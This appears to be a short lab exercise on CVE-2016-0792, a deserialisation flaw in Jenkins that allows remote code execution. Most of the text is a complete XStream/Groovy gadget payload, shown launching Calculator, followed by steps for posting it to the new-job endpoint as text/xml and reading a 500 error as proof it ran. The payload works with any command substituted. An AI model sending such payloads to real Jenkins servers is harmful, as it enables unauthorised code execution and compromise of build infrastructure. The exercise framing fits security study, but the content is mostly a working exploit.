# CVE-2016-0792

### Introduction

This issue was discovered in Jenkins and allow an attacker to gain remote code execution on the server hosting Jenkins.

Jenkins supports serialised objects based on **XStream**. Previously, it was possible to get code execution using `java.beans.EventHandler`but it's no longer the case.

Jenkins embeds few third party libraries that include Gadget that can provide an attacker with remote code execution. The payload  illustrated in this exercise relies on `Groovy`:

```xml
<map>
  <entry>
    <groovy.util.Expando>
      <expandoProperties>
        <entry>
          <string>hashCode</string>
          <org.codehaus.groovy.runtime.MethodClosure>
            <delegate class="groovy.util.Expando"/>
            <owner class="java.lang.ProcessBuilder">
              <command>
                <string>open</string>
                <string>/Applications/Calculator.app</string>
              </command>
            </owner>
            <method>start</method>
          </org.codehaus.groovy.runtime.MethodClosure>
        </entry>
      </expandoProperties>
    </groovy.util.Expando>
    <int>1</int>
  </entry>
</map>
```

### Exploit

* when we create a post request for a `new job` in jenkins dashboard.

  its name goes in a arguement called `?name=` and if same name provided twice it triggers an error.

  So, the solution is remove the whole post request and provide

   `?name=anyuniquename` arguement in the url itself and paste the above **XML payload** in the body.

  change **Content type: text/xml**

  Now it will 500 error in the response that means there is an error in the command after it is executed, So that means our code is already executed.